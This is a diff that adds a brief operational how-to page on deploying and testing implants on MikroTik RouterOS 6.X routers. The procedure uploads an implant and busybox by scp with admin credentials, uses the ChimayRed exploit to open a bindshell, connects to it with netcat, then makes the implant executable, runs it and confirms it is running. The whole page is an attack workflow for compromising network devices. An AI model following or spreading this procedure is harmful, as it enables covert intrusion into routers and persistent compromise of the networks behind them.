@@ -1,0 +1,30 @@
+
+                        Working with MikroTik RouterOS 6.X
+This work was done specifically with the MikroTik Cloud Core Router CCR-1016G which is described more on this page.  However, this article is more about working with RouterOS 6.X and should be hardware agnostic.
+Many of the previous access methods in RouterOS (i.e. devel login) have been closed with RouterOS 6.X, so this is how I test implants with RouterOS 6.X:
+
+
+Upload binaries to target using scp and admin user credentials.  Note: the root of scp is chrooted to /flash/rw/pckg:
+scp implant admin@router-ip:/
+
+
+Upload a full featured busybox with the implant to /flash/rw/pckg
+scp busybox-ARCH admin@router-ip:/
+
+Use ChimayRed to get a bindshell (see ChimayRed help from command line)
+
+Netcat to the ChimayRed enabled bindshell
+nc router-ip <port>
+
+
+From the bindshell, make binaries executable, execute implant(s), and perform diagnostics:
+cd /flash/rw/pckg
+chmod +x implant
+chmod +x busybox
+./implant
+./busybox ls -lrt
+./busybox ps | ./busybox grep implant
+   
+
+
+                    
